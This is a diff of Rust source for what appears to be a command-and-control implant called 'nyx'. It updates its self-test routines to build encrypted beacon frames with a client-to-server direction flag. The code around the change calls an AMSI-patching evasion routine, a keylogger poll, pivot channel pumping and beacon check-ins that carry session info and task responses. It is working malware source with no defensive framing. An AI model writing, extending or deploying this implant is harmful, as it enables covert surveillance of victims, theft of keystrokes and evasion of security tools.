@@ -877,7 +877,7 @@ pub unsafe extern "system" fn nyx_selftest_csprng() {
     // Step 4: Test mem::register_key + encode_frame (the beacon frame builder).
     crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
-    let frame = match nyx_protocol::encode_frame(&pubkey, 0u64, &key, b"test_info") {
+    let frame = match nyx_protocol::encode_frame_dir(&pubkey, nyx_protocol::Direction::ClientToServer, 0u64, &key, b"test_info") {
         Ok(f) => f,
         Err(_) => unsafe { exit(0xA7) }, // encode_frame seal failure (AEAD alloc)
     };
@@ -930,7 +930,7 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     let info_plain = iw.into_bytes();
 
     // Check-in with SessionInfo payload.
-    let frame = match nyx_protocol::encode_frame(&pubkey, 0u64, &key, &info_plain) {
+    let frame = match nyx_protocol::encode_frame_dir(&pubkey, nyx_protocol::Direction::ClientToServer, 0u64, &key, &info_plain) {
         Ok(f) => f,
         Err(_) => unsafe { exit(0xB8) }, // check-in frame seal failure
     };
@@ -961,8 +961,8 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     // 0xB4: all 3 cycle ops OK
 
     // Simulate task-loop first POST: encode empty TaskResponse batch + send.
-    let frame2 = match nyx_protocol::encode_frame(
-        &pubkey,
+    let frame2 = match nyx_protocol::encode_frame_dir(
+        &pubkey, nyx_protocol::Direction::ClientToServer,
         1u64,
         &key,
         &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
@@ -1004,8 +1004,8 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     let _ = crate::blind::maybe_patch_amsi();
     crate::keylog::poll_once();
     let _ = crate::pivot::pump_channels();
-    let frame3 = match nyx_protocol::encode_frame(
-        &pubkey,
+    let frame3 = match nyx_protocol::encode_frame_dir(
+        &pubkey, nyx_protocol::Direction::ClientToServer,
         2u64,
         &key,
         &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
@@ -1088,7 +1088,7 @@ pub unsafe extern "system" fn nyx_selftest_noevasion_diag() {
     let info_plain = iw.into_bytes();
 
     mk("step10_encode_frame\n");
-    let frame = match nyx_protocol::encode_frame(&pubkey, 0u64, &key, &info_plain) {
+    let frame = match nyx_protocol::encode_frame_dir(&pubkey, nyx_protocol::Direction::ClientToServer, 0u64, &key, &info_plain) {
         Ok(f) => f,
         Err(_) => { mk("FAIL_encode_frame\n"); unsafe { exit(0xF9); } }
     };
@@ -1109,8 +1109,8 @@ pub unsafe extern "system" fn nyx_selftest_noevasion_diag() {
     crate::beacon::sleep_seconds(1);
 
     mk("step13_second_post\n");
-    let frame2 = match nyx_protocol::encode_frame(
-        &pubkey, 1u64, &key,
+    let frame2 = match nyx_protocol::encode_frame_dir(
+        &pubkey, nyx_protocol::Direction::ClientToServer, 1u64, &key,
         &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch"),
     ) {
         Ok(f) => f,
